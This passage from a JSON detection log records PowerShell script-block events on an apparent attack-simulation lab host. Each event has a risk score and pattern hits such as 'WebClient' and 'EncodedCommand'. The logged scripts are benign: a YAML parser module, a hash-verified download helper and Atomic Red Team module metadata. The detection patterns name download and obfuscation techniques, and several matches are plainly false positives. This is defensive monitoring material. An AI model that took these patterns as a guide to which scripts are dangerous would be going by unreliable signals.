      "full_command": "# Copyright 2016 Cloudbase Solutions Srl\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n#\n\nenum SerializationOptions {\n    None = 0\n    Roundtrip = 1\n    DisableAliases = 2\n    EmitDefaults = 4\n    JsonCompatible = 8\n    DefaultToStaticType = 16\n    WithIndentedSequences = 32\n}\n$here = Split-Path -Parent $MyInvocation.MyCommand.Path\n$assemblies = Join-Path $here \"Load-Assemblies.ps1\"\n$infinityRegex = [regex]::new('^[-+]?(\\.inf|\\.Inf|\\.INF)$', \"Compiled, CultureInvariant\");\n\nif (Test-Path $assemblies) {\n    . $here\\Load-Assemblies.ps1\n}\n\nfunction Get-YamlDocuments {\n    [CmdletBinding()]\n    Param(\n        [Parameter(Mandatory=$true, ValueFromPipeline=$true)]\n        [string]$Yaml,\n        [switch]$UseMergingParser=$false\n    )\n    PROCESS {\n        $stringReader = new-object System.IO.StringReader($Yaml)\n        $parser = New-Object \"YamlDotNet.Core.Parser\" $stringReader\n        if($UseMergingParser) {\n            $parser = New-Object \"YamlDotNet.Core.MergingParser\" $parser\n        }\n\n        $yamlStream = New-Object \"YamlDotNet.RepresentationModel.YamlStream\"\n        $yamlStream.Load([YamlDotNet.Core.IParser] $parser)\n\n        $stringReader.Close()\n\n        return $yamlStream\n    }\n}\n\nfunction Convert-ValueToProperType {\n    [CmdletBinding()]\n    Param(\n        [Parameter(Mandatory=$true,ValueFromPipeline=$true)]\n        [System.Object]$Node\n    )\n    PROCESS {\n        if (!($Node.Value -is [string])) {\n            return $Node\n        }\n        \n        if ([string]::IsNullOrEmpty($Node.Tag) -eq $false) {\n            switch($Node.Tag) {\n                \"tag:yaml.org,2002:str\" {\n                    return $Node.Value\n                }\n                \"tag:yaml.org,2002:null\" {\n                    return $null\n                }\n                \"tag:yaml.org,2002:bool\" {\n                    $parsedValue = $false\n                    if (![boolean]::TryParse($Node.Value, [ref]$parsedValue)) {\n                        Throw (\"failed to parse scalar {0} as boolean\" -f $Node)\n                    }\n                    return $parsedValue\n                }\n                \"tag:yaml.org,2002:int\" {\n                    $parsedValue = 0\n                    if ($node.Value.Length -gt 2) {\n                        switch ($node.Value.Substring(0, 2)) {\n                            \"0o\" {\n                                $parsedValue = [Convert]::ToInt64($Node.Value.Substring(2), 8)\n                            }\n                            \"0x\" {\n                                $parsedValue = [Convert]::ToInt64($Node.Value.Substring(2), 16)\n                            }\n                            default {\n                                if (![long]::TryParse($Node.Value, [Globalization.NumberStyles]::Any, [Globalization.CultureInfo]::InvariantCulture, [ref]$parsedValue)) {\n                                    Throw (\"failed to parse scalar {0} as long\" -f $Node)\n                                }\n                            }\n                        }\n                    } else {\n                        if (![long]::TryParse($Node.Value, [Globalization.NumberStyles]::Any, [Globalization.CultureInfo]::InvariantCulture, [ref]$parsedValue)) {\n                            Throw (\"failed to parse scalar {0} as long\" -f $Node)\n                        }\n                    }\n                    return $parsedValue\n                }\n                \"tag:yaml.org,2002:float\" {\n                    $parsedValue = 0.0\n                    if ($infinityRegex.Matches($Node.Value)) {\n                        $prefix = $Node.Value.Substring(0, 1)\n                        switch ($prefix) {\n                            \"-\" {\n                                return [double]::NegativeInfinity\n                            }\n                            default {\n                                # Prefix is either missing or is a +\n                                return [double]::PositiveInfinity\n                            }\n                        }\n                    }\n                    if (![double]::TryParse($Node.Value, [Globalization.NumberStyles]::Any, [Globalization.CultureInfo]::InvariantCulture, [ref]$parsedValue)) {\n                        Throw (\"failed to parse scalar {0} as double\" -f $Node)\n                    }\n                    return $parsedValue\n                }\n                \"tag:yaml.org,2002:timestamp\" {\n                    # From the YAML spec: http://yaml.org/type/timestamp.html\n                    [DateTime]$parsedValue = [DateTime]::MinValue\n                    $ts = [DateTime]::SpecifyKind($Node.Value, [System.DateTimeKind]::Utc)\n                    $tss = $ts.ToString(\"o\")\n                    if(![datetime]::TryParse($tss, $null, [System.Globalization.DateTimeStyles]::RoundtripKind, [ref] $parsedValue)) {\n                        Throw (\"failed to parse scalar {0} as DateTime\" -f $Node)\n                    }\n                    return $parsedValue\n                }\n            }\n        }\n\n        if ($Node.Style -eq 'Plain')\n        {\n            $types = @([int], [long], [double], [boolean], [decimal])\n            foreach($i in $types){\n                $parsedValue = New-Object -TypeName $i.FullName\n                if ($i.IsAssignableFrom([boolean])){\n                    $result = $i::TryParse($Node,[ref]$parsedValue) \n                } else {\n                    $result = $i::TryParse($Node, [Globalization.NumberStyles]::Any, [Globalization.CultureInfo]::InvariantCulture, [ref]$parsedValue)\n                }\n                if( $result ) {\n                    return $parsedValue\n                }\n            }\n        }\n\n        if ($Node.Style -eq 'Plain' -and $Node.Value -in '','~','null','Null','NULL') {\n            return $null\n        }\n\n        return $Node.Value\n    }\n}\n\nfunction Convert-YamlMappingToHashtable {\n    [CmdletBinding()]\n    Param(\n        [Parameter(Mandatory=$true, ValueFromPipeline=$true)]\n        [YamlDotNet.RepresentationModel.YamlMappingNode]$Node,\n        [switch] $Ordered\n    )\n    PROCESS {\n        if ($Ordered) { $ret = [ordered]@{} } else { $ret = @{} }\n        foreach($i in $Node.Children.Keys) {\n            $ret[$i.Value] = Convert-YamlDocumentToPSObject $Node.Children[$i] -Ordered:$Ordered\n        }\n        return $ret\n    }\n}\n\nfunction Convert-YamlSequenceToArray {\n    [CmdletBinding()]\n    Param(\n        [Parameter(Mandatory=$true, ValueFromPipeline=$true)]\n        [YamlDotNet.RepresentationModel.YamlSequenceNode]$Node,\n        [switch]$Ordered\n    )\n    PROCESS {\n        $ret = [System.Collections.Generic.List[object]](New-Object \"System.Collections.Generic.List[object]\")\n        foreach($i in $Node.Children){\n            $ret.Add((Convert-YamlDocumentToPSObject $i -Ordered:$Ordered))\n        }\n        return ,$ret\n    }\n}\n\nfunction Convert-YamlDocumentToPSObject {\n    [CmdletBinding()]\n    Param(\n        [Parameter(Mandatory=$true, ValueFromPipeline=$true)]\n        [System.Object]$Node, \n        [switch]$Ordered\n    )\n    PROCESS {\n        switch($Node.GetType().FullName){\n            \"YamlDotNet.RepresentationModel.YamlMappingNode\"{\n                return Convert-YamlMappingToHashtable $Node -Ordered:$Ordered\n            }\n            \"YamlDotNet.RepresentationModel.YamlSequenceNode\" {\n                return Convert-YamlSequenceToArray $Node -Ordered:$Ordered\n            }\n            \"YamlDotNet.RepresentationModel.YamlScalarNode\" {\n                return (Convert-ValueToProperType $Node)\n            }\n        }\n    }\n}\n\nfunction Convert-HashtableToDictionary {\n    Param(\n        [Parameter(Mandatory=$true,ValueFromPipeline=$true)]\n        [hashtable]$Data\n    )\n    foreach($i in $($data.Keys)) {\n        $Data[$i] = Convert-PSObjectToGenericObject $Data[$i]\n    }\n    return $Data\n}\n\nfunction Convert-OrderedHashtableToDictionary {\n    Param(\n        [Parameter(Mandatory=$true,ValueFromPipeline=$true)]\n        [System.Collections.Specialized.OrderedDictionary] $Data\n    )\n    foreach ($i in $($data.Keys)) {\n        $Data[$i] = Convert-PSObjectToGenericObject $Data[$i]\n    }\n    return $Data\n}\n\nfunction Convert-ListToGenericList {\n    Param(\n        [Parameter(Mandatory=$false,ValueFromPipeline=$true)]\n        [array]$Data=@()\n    )\n    $ret = [System.Collections.Generic.List[object]](New-Object \"System.Collections.Generic.List[object]\")\n    for($i=0; $i -lt $Data.Count; $i++) {\n        $ret.Add((Convert-PSObjectToGenericObject $Data[$i]))\n    }\n    return ,$ret\n}\n\nfunction Convert-PSCustomObjectToDictionary {\n    Param(\n        [Parameter(Mandatory=$true,ValueFromPipeline=$true)]\n        [PSCustomObject]$Data\n    )\n    $ret = [System.Collections.Generic.Dictionary[string,object]](New-Object 'System.Collections.Generic.Dictionary[string,object]')\n    foreach ($i in $Data.psobject.properties) {\n        $ret[$i.Name] = Convert-PSObjectToGenericObject $i.Value\n    }\n    return $ret\n}\n\nfunction Convert-PSObjectToGenericObject {\n    Param(\n        [Parameter(Mandatory=$false,ValueFromPipeline=$true)]\n        [System.Object]$Data\n    )\n\n    if ($null -eq $data) {\n        return $data\n    }\n\n    $dataType = $data.GetType()\n    if ($data -isnot [System.Object]) {\n        return $data -as $dataType\n    }\n\n    if ($dataType.FullName -eq \"System.Management.Automation.PSCustomObject\") {\n        return Convert-PSCustomObjectToDictionary $data\n    } elseif (([System.Collections.Specialized.OrderedDictionary].IsAssignableFrom($dataType))){\n        return Convert-OrderedHashtableToDictionary $data\n    } elseif (([System.Collections.IDictionary].IsAssignableFrom($dataType))){\n        return Convert-HashtableToDictionary $data\n    } elseif (([System.Collections.IList].IsAssignableFrom($dataType))) {\n        return Convert-ListToGenericList $data\n    }\n    return $data -as $dataType\n}\n\nfunction ConvertFrom-Yaml {\n    [CmdletBinding()]\n    Param(\n        [Parameter(Mandatory=$false, ValueFromPipeline=$true, Position=0)]\n        [string]$Yaml,\n        [switch]$AllDocuments=$false,\n        [switch]$Ordered,\n        [switch]$UseMergingParser=$false\n    )\n\n    BEGIN {\n        $d = \"\"\n    }\n    PROCESS {\n        if($Yaml -is [string]) {\n            $d += $Yaml + \"`n\"\n        }\n    }\n\n    END {\n        if($d -eq \"\"){\n            return\n        }\n        $documents = Get-YamlDocuments -Yaml $d -UseMergingParser:$UseMergingParser\n        if (!$documents.Count) {\n            return\n        }\n        if($documents.Count -eq 1){\n            return Convert-YamlDocumentToPSObject $documents[0].RootNode -Ordered:$Ordered\n        }\n        if(!$AllDocuments) {\n            return Convert-YamlDocumentToPSObject $documents[0].RootNode -Ordered:$Ordered\n        }\n        $ret = @()\n        foreach($i in $documents) {\n            $ret += Convert-YamlDocumentToPSObject $i.RootNode -Ordered:$Ordered\n        }\n        return $ret\n    }\n}\n\n$stringQuotingEmitterSource = @\"\nusing System;\nusing System.Text.RegularExpressions;\nusing YamlDotNet;\nusing YamlDotNet.Core;\nusing YamlDotNet.Serialization;\nusing YamlDotNet.Serialization.EventEmitters;\npublic class StringQuotingEmitter: ChainedEventEmitter {\n    // Patterns from https://yaml.org/spec/1.2/spec.html#id2804356\n    private static Regex quotedRegex = new Regex(@`\"^(\\~|null|true|false|on|off|yes|no|y|n|[-+]?(\\.[0-9]+|[0-9]+(\\.[0-9]*)?)([eE][-+]?[0-9]+)?|[-+]?(\\.inf))?$`\", RegexOptions.Compiled | RegexOptions.IgnoreCase);\n    public StringQuotingEmitter(IEventEmitter next): base(next) {}\n\n    public override void Emit(ScalarEventInfo eventInfo, IEmitter emitter) {\n        var typeCode = eventInfo.Source.Value != null\n        ? Type.GetTypeCode(eventInfo.Source.Type)\n        : TypeCode.Empty;\n\n        switch (typeCode) {\n            case TypeCode.Char:\n                if (Char.IsDigit((char)eventInfo.Source.Value)) {\n                    eventInfo.Style = ScalarStyle.DoubleQuoted;\n                }\n                break;\n            case TypeCode.String:\n                var val = eventInfo.Source.Value.ToString();\n                if (quotedRegex.IsMatch(val))\n                {\n                    eventInfo.Style = ScalarStyle.DoubleQuoted;\n                } else if (val.IndexOf('\\n') > -1) {\n                    eventInfo.Style = ScalarStyle.Literal;\n                }\n                break;\n        }\n\n        base.Emit(eventInfo, emitter);\n    }\n\n    public static SerializerBuilder Add(SerializerBuilder builder) {\n        return builder.WithEventEmitter(next => new StringQuotingEmitter(next));\n    }\n}\n\"@\n\nif (!([System.Management.Automation.PSTypeName]'StringQuotingEmitter').Type) {\n    $referenceList = @([YamlDotNet.Serialization.Serializer].Assembly.Location,[Text.RegularExpressions.Regex].Assembly.Location)\n    if ($PSVersionTable.PSEdition -eq \"Core\") {\n        $referenceList += [IO.Directory]::GetFiles([IO.Path]::Combine($PSHOME, 'ref'), 'netstandard.dll', [IO.SearchOption]::TopDirectoryOnly)\n        Add-Type -TypeDefinition $stringQuotingEmitterSource -ReferencedAssemblies $referenceList -Language CSharp -CompilerOptions \"-nowarn:1701\"\n    } else {\n        Add-Type -TypeDefinition $stringQuotingEmitterSource -ReferencedAssemblies $referenceList -Language CSharp\n    }\n}\n\nfunction Get-Serializer {\n    Param(\n        [Parameter(Mandatory=$true)][SerializationOptions]$Options\n    )\n    \n    $builder = New-Object \"YamlDotNet.Serialization.SerializerBuilder\"\n    \n    if ($Options.HasFlag([SerializationOptions]::Roundtrip)) {\n        $builder = $builder.EnsureRoundtrip()\n    }\n    if ($Options.HasFlag([SerializationOptions]::DisableAliases)) {\n        $builder = $builder.DisableAliases()\n    }\n    if ($Options.HasFlag([SerializationOptions]::EmitDefaults)) {\n        $builder = $builder.EmitDefaults()\n    }\n    if ($Options.HasFlag([SerializationOptions]::JsonCompatible)) {\n        $builder = $builder.JsonCompatible()\n    }\n    if ($Options.HasFlag([SerializationOptions]::DefaultToStaticType)) {\n        $builder = $builder.WithTypeResolver((New-Object \"YamlDotNet.Serialization.TypeResolvers.StaticTypeResolver\"))\n    }\n    if ($Options.HasFlag([SerializationOptions]::WithIndentedSequences)) {\n        $builder = $builder.WithIndentedSequences()\n    }\n    $builder = [StringQuotingEmitter]::Add($builder)\n    return $builder.Build()\n}\n\nfunction ConvertTo-Yaml {\n    [CmdletBinding(DefaultParameterSetName = 'NoOptions')]\n    Param(\n        [Parameter(ValueFromPipeline = $true, Position=0)]\n        [System.Object]$Data,\n\n        [string]$OutFile,\n\n        [Parameter(ParameterSetName = 'Options')]\n        [SerializationOptions]$Options = [SerializationOptions]::Roundtrip,\n\n        [Parameter(ParameterSetName = 'NoOptions')]\n        [switch]$JsonCompatible,\n        \n        [switch]$KeepArray,\n\n        [switch]$Force\n    )\n    BEGIN {\n        $d = [System.Collections.Generic.List[object]](New-Object \"System.Collections.Generic.List[object]\")\n    }\n    PROCESS {\n        if($data -is [System.Object]) {\n            $d.Add($data)\n        }\n    }\n    END {\n        if ($d -eq $null -or $d.Count -eq 0) {\n            return\n        }\n        if ($d.Count -eq 1 -and !($KeepArray)) {\n            $d = $d[0]\n        }\n        $norm = Convert-PSObjectToGenericObject $d\n        if ($OutFile) {\n            $parent = Split-Path $OutFile\n            if (!(Test-Path $parent)) {\n                Throw \"Parent folder for specified path does not exist\"\n            }\n            if ((Test-Path $OutFile) -and !$Force) {\n                Throw \"Target file already exists. Use -Force to overwrite.\"\n            }\n            $wrt = New-Object \"System.IO.StreamWriter\" $OutFile\n        } else {\n            $wrt = New-Object \"System.IO.StringWriter\"\n        }\n    \n        if ($PSCmdlet.ParameterSetName -eq 'NoOptions') {\n            $Options = 0\n            if ($JsonCompatible) {\n                # No indent options :~(\n                $Options = [SerializationOptions]::JsonCompatible\n            }\n        }\n\n        try {\n            $serializer = Get-Serializer $Options\n            $serializer.Serialize($wrt, $norm)\n        }\n        catch{\n            $_\n        }\n        finally {\n            $wrt.Close()\n        }\n        if ($OutFile) {\n            return\n        } else {\n            return $wrt.ToString()\n        }\n    }\n}\n\nNew-Alias -Name cfy -Value ConvertFrom-Yaml\nNew-Alias -Name cty -Value ConvertTo-Yaml\n\nExport-ModuleMember -Function ConvertFrom-Yaml,ConvertTo-Yaml -Alias cfy,cty\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'WebClient' matched: 'http'\nPattern 'WebClient' matched: 'http'\nPattern 'WebClient' matched: 'http'"
    },
    {
      "timestamp": "2024-12-16T20:34:56.1136281+00:00",
      "event_id": 35710900,
      "risk_score": 6,
      "detected_patterns": ", WebClient, Get",
      "pattern_details": "WebClient [Score: 5]; Get [Score: 1]",
      "command_length": 1039,
      "full_command": "function Invoke-WebRequestVerifyHash ($url, $outfile, $hash) {\n    $success = $false\n    $null = @(\n        New-Item -ItemType Directory (Split-Path $outfile) -Force | Out-Null\n        $ms = New-Object IO.MemoryStream\n        [Net.ServicePointManager]::SecurityProtocol = ([Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls12)\n        (New-Object System.Net.WebClient).OpenRead($url).copyto($ms)\n        $ms.seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null\n        $actualHash = (Get-FileHash -InputStream $ms).Hash\n        if ( $hash -eq $actualHash) {\n            $ms.seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null\n            $fileStream = New-Object IO.FileStream $outfile, ([System.IO.FileMode]::Create)\n            $ms.CopyTo($fileStream);\n            $fileStream.Close()\n            $success = $true\n        }\n        else {\n            Write-Host -ForegroundColor red \"File hash mismatch, expected: $hash, actual: $actualHash\"\n        }\n    )\n    $success\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:56.7428614+00:00",
      "event_id": 35711001,
      "risk_score": 6,
      "detected_patterns": ", WebClient, Get",
      "pattern_details": "WebClient [Score: 5]; Get [Score: 1]",
      "command_length": 3535,
      "full_command": "@{\n\n    # Script module or binary module file associated with this manifest.\n    RootModule        = 'Invoke-AtomicRedTeam.psm1'\n\n    # Version number of this module.\n    ModuleVersion     = '2.1.0'\n\n    # ID used to uniquely identify this module\n    GUID              = '8f492621-18f8-432e-9532-b1d54d3e90bd'\n\n    # Author of this module\n    Author            = 'Casey Smith @subTee, Josh Rickard @MSAdministrator, Carrie Roberts @OrOneEqualsOne, Matt Graeber @mattifestation'\n\n    # Company or vendor of this module\n    CompanyName       = 'Red Canary, Inc.'\n\n    # Copyright statement for this module\n    Copyright         = '(c) 2021 Red Canary. All rights reserved.'\n\n    # Description of the functionality provided by this module\n    Description       = 'A PowerShell module that runs Atomic Red Team tests from yaml definition files.'\n\n    # Minimum version of the Windows PowerShell engine required by this module\n    PowerShellVersion = '5.0'\n\n    # Modules that must be imported into the global environment prior to importing this module\n    RequiredModules   = @('powershell-yaml')\n\n    # Script files (.ps1) that are run in the caller's environment prior to importing this module.\n    # AtomicClassSchema.ps1 needs to be present in the caller's scope in order for the built-in classes to surface properly.\n    ScriptsToProcess  = @('Private\\AtomicClassSchema.ps1', 'Public\\config.ps1')\n\n    # Functions to export from this module, for best performance, do not use wildcards and do not delete the entry, use an empty array if there are no functions to export.\n    FunctionsToExport = @(\n        'Invoke-AtomicTest',\n        'Get-AtomicTechnique',\n        'New-AtomicTechnique',\n        'New-AtomicTest',\n        'New-AtomicTestInputArgument',\n        'New-AtomicTestDependency',\n        'Start-AtomicGUI',\n        'Stop-AtomicGUI',\n        'Invoke-SetupAtomicRunner',\n        'Invoke-GenerateNewSchedule',\n        'Invoke-RefreshExistingSchedule',\n        'Invoke-AtomicRunner',\n        'Get-Schedule',\n        'Invoke-KickoffAtomicRunner',\n        'Get-PreferredIPAddress',\n        'Invoke-KillProcessTree'\n    )\n\n    # Variables to export from this module\n    VariablesToExport = '*'\n\n    NestedModules     = @(\n        \"Public\\Default-ExecutionLogger.psm1\",\n        \"Public\\Attire-ExecutionLogger.psm1\",\n        \"Public\\Syslog-ExecutionLogger.psm1\",\n        \"Public\\WinEvent-ExecutionLogger.psm1\"\n    )\n\n    # Private data to pass to the module specified in RootModule/ModuleToProcess. This may also contain a PSData hashtable with additional module metadata used by PowerShell.\n    PrivateData       = @{\n\n        PSData = @{\n\n            # Tags applied to this module. These help with module discovery in online galleries.\n            Tags         = @('Security', 'Defense')\n\n            # A URL to the license for this module.\n            LicenseUri   = 'https://github.com/redcanaryco/invoke-atomicredteam/blob/master/LICENSE.txt'\n\n            # A URL to the main website for this project.\n            ProjectUri   = 'https://github.com/redcanaryco/invoke-atomicredteam'\n\n            # A URL to an icon representing this module.\n            # IconUri = ''\n\n            # ReleaseNotes of this module\n            ReleaseNotes = @'\n1.0.2\n-----\n* Add support for custom execution loggers\n\n1.0.1\n-----\n* Adding 'powershell-yaml' to RequiredModules in the module manifest\n\n1.0.0\n-----\n* Initial release for submission to the PowerShell Gallery\n'@\n\n        } # End of PSData hashtable\n\n    } # End of PrivateData hashtable\n}",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'WebClient' matched: 'http'\nPattern 'WebClient' matched: 'http'"
    },
    {
      "timestamp": "2024-12-16T20:34:54.7091908+00:00",
      "event_id": 35710623,
      "risk_score": 6,
      "detected_patterns": ", WebClient, Get",
      "pattern_details": "WebClient [Score: 5]; Get [Score: 1]",
      "command_length": 3535,
      "full_command": "@{\n\n    # Script module or binary module file associated with this manifest.\n    RootModule        = 'Invoke-AtomicRedTeam.psm1'\n\n    # Version number of this module.\n    ModuleVersion     = '2.1.0'\n\n    # ID used to uniquely identify this module\n    GUID              = '8f492621-18f8-432e-9532-b1d54d3e90bd'\n\n    # Author of this module\n    Author            = 'Casey Smith @subTee, Josh Rickard @MSAdministrator, Carrie Roberts @OrOneEqualsOne, Matt Graeber @mattifestation'\n\n    # Company or vendor of this module\n    CompanyName       = 'Red Canary, Inc.'\n\n    # Copyright statement for this module\n    Copyright         = '(c) 2021 Red Canary. All rights reserved.'\n\n    # Description of the functionality provided by this module\n    Description       = 'A PowerShell module that runs Atomic Red Team tests from yaml definition files.'\n\n    # Minimum version of the Windows PowerShell engine required by this module\n    PowerShellVersion = '5.0'\n\n    # Modules that must be imported into the global environment prior to importing this module\n    RequiredModules   = @('powershell-yaml')\n\n    # Script files (.ps1) that are run in the caller's environment prior to importing this module.\n    # AtomicClassSchema.ps1 needs to be present in the caller's scope in order for the built-in classes to surface properly.\n    ScriptsToProcess  = @('Private\\AtomicClassSchema.ps1', 'Public\\config.ps1')\n\n    # Functions to export from this module, for best performance, do not use wildcards and do not delete the entry, use an empty array if there are no functions to export.\n    FunctionsToExport = @(\n        'Invoke-AtomicTest',\n        'Get-AtomicTechnique',\n        'New-AtomicTechnique',\n        'New-AtomicTest',\n        'New-AtomicTestInputArgument',\n        'New-AtomicTestDependency',\n        'Start-AtomicGUI',\n        'Stop-AtomicGUI',\n        'Invoke-SetupAtomicRunner',\n        'Invoke-GenerateNewSchedule',\n        'Invoke-RefreshExistingSchedule',\n        'Invoke-AtomicRunner',\n        'Get-Schedule',\n        'Invoke-KickoffAtomicRunner',\n        'Get-PreferredIPAddress',\n        'Invoke-KillProcessTree'\n    )\n\n    # Variables to export from this module\n    VariablesToExport = '*'\n\n    NestedModules     = @(\n        \"Public\\Default-ExecutionLogger.psm1\",\n        \"Public\\Attire-ExecutionLogger.psm1\",\n        \"Public\\Syslog-ExecutionLogger.psm1\",\n        \"Public\\WinEvent-ExecutionLogger.psm1\"\n    )\n\n    # Private data to pass to the module specified in RootModule/ModuleToProcess. This may also contain a PSData hashtable with additional module metadata used by PowerShell.\n    PrivateData       = @{\n\n        PSData = @{\n\n            # Tags applied to this module. These help with module discovery in online galleries.\n            Tags         = @('Security', 'Defense')\n\n            # A URL to the license for this module.\n            LicenseUri   = 'https://github.com/redcanaryco/invoke-atomicredteam/blob/master/LICENSE.txt'\n\n            # A URL to the main website for this project.\n            ProjectUri   = 'https://github.com/redcanaryco/invoke-atomicredteam'\n\n            # A URL to an icon representing this module.\n            # IconUri = ''\n\n            # ReleaseNotes of this module\n            ReleaseNotes = @'\n1.0.2\n-----\n* Add support for custom execution loggers\n\n1.0.1\n-----\n* Adding 'powershell-yaml' to RequiredModules in the module manifest\n\n1.0.0\n-----\n* Initial release for submission to the PowerShell Gallery\n'@\n\n        } # End of PSData hashtable\n\n    } # End of PrivateData hashtable\n}",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'WebClient' matched: 'http'\nPattern 'WebClient' matched: 'http'"
    },
    {
      "timestamp": "2024-12-16T20:34:55.6031021+00:00",
      "event_id": 35710814,
      "risk_score": 6,
      "detected_patterns": ", WebClient, Get",
      "pattern_details": "WebClient [Score: 5]; Get [Score: 1]",
      "command_length": 3535,
      "full_command": "@{\n\n    # Script module or binary module file associated with this manifest.\n    RootModule        = 'Invoke-AtomicRedTeam.psm1'\n\n    # Version number of this module.\n    ModuleVersion     = '2.1.0'\n\n    # ID used to uniquely identify this module\n    GUID              = '8f492621-18f8-432e-9532-b1d54d3e90bd'\n\n    # Author of this module\n    Author            = 'Casey Smith @subTee, Josh Rickard @MSAdministrator, Carrie Roberts @OrOneEqualsOne, Matt Graeber @mattifestation'\n\n    # Company or vendor of this module\n    CompanyName       = 'Red Canary, Inc.'\n\n    # Copyright statement for this module\n    Copyright         = '(c) 2021 Red Canary. All rights reserved.'\n\n    # Description of the functionality provided by this module\n    Description       = 'A PowerShell module that runs Atomic Red Team tests from yaml definition files.'\n\n    # Minimum version of the Windows PowerShell engine required by this module\n    PowerShellVersion = '5.0'\n\n    # Modules that must be imported into the global environment prior to importing this module\n    RequiredModules   = @('powershell-yaml')\n\n    # Script files (.ps1) that are run in the caller's environment prior to importing this module.\n    # AtomicClassSchema.ps1 needs to be present in the caller's scope in order for the built-in classes to surface properly.\n    ScriptsToProcess  = @('Private\\AtomicClassSchema.ps1', 'Public\\config.ps1')\n\n    # Functions to export from this module, for best performance, do not use wildcards and do not delete the entry, use an empty array if there are no functions to export.\n    FunctionsToExport = @(\n        'Invoke-AtomicTest',\n        'Get-AtomicTechnique',\n        'New-AtomicTechnique',\n        'New-AtomicTest',\n        'New-AtomicTestInputArgument',\n        'New-AtomicTestDependency',\n        'Start-AtomicGUI',\n        'Stop-AtomicGUI',\n        'Invoke-SetupAtomicRunner',\n        'Invoke-GenerateNewSchedule',\n        'Invoke-RefreshExistingSchedule',\n        'Invoke-AtomicRunner',\n        'Get-Schedule',\n        'Invoke-KickoffAtomicRunner',\n        'Get-PreferredIPAddress',\n        'Invoke-KillProcessTree'\n    )\n\n    # Variables to export from this module\n    VariablesToExport = '*'\n\n    NestedModules     = @(\n        \"Public\\Default-ExecutionLogger.psm1\",\n        \"Public\\Attire-ExecutionLogger.psm1\",\n        \"Public\\Syslog-ExecutionLogger.psm1\",\n        \"Public\\WinEvent-ExecutionLogger.psm1\"\n    )\n\n    # Private data to pass to the module specified in RootModule/ModuleToProcess. This may also contain a PSData hashtable with additional module metadata used by PowerShell.\n    PrivateData       = @{\n\n        PSData = @{\n\n            # Tags applied to this module. These help with module discovery in online galleries.\n            Tags         = @('Security', 'Defense')\n\n            # A URL to the license for this module.\n            LicenseUri   = 'https://github.com/redcanaryco/invoke-atomicredteam/blob/master/LICENSE.txt'\n\n            # A URL to the main website for this project.\n            ProjectUri   = 'https://github.com/redcanaryco/invoke-atomicredteam'\n\n            # A URL to an icon representing this module.\n            # IconUri = ''\n\n            # ReleaseNotes of this module\n            ReleaseNotes = @'\n1.0.2\n-----\n* Add support for custom execution loggers\n\n1.0.1\n-----\n* Adding 'powershell-yaml' to RequiredModules in the module manifest\n\n1.0.0\n-----\n* Initial release for submission to the PowerShell Gallery\n'@\n\n        } # End of PSData hashtable\n\n    } # End of PrivateData hashtable\n}",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'WebClient' matched: 'http'\nPattern 'WebClient' matched: 'http'"
    },
    {
      "timestamp": "2024-12-16T20:34:56.0745454+00:00",
      "event_id": 35710873,
      "risk_score": 6,
      "detected_patterns": ", EncodedCommand, SuspiciousCmdlet, Get",
      "pattern_details": "EncodedCommand [Score: 4]; SuspiciousCmdlet [Score: 1]; Get [Score: 1]",
      "command_length": 431,
      "full_command": "function Get-PreferredIPAddress($isWindows) {\n    if ($isWindows) {\n        return (Get-NetIPAddress | Where-Object { $_.PrefixOrigin -ne \"WellKnown\" }).IPAddress\n    }\n    elseif ($IsMacOS) {\n        return /sbin/ifconfig -l | /usr/bin/xargs -n1 /usr/sbin/ipconfig getifaddr\n    }\n    elseif ($IsLinux) {\n        return ip -4 -br addr show | sed -n -e 's/^.*UP\\s* //p' | cut -d \"/\" -f 1\n    }\n    else {\n        return ''\n    }\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'EncodedCommand' matched: '-e ''\nPattern 'SuspiciousCmdlet' matched: 'Get-NetIPAddress'"
    },
    {
      "timestamp": "2024-12-16T20:34:55.7370096+00:00",
      "event_id": 35710833,
      "risk_score": 6,
      "detected_patterns": ", WebClient, Get",
      "pattern_details": "WebClient [Score: 5]; Get [Score: 1]",
      "command_length": 16921,
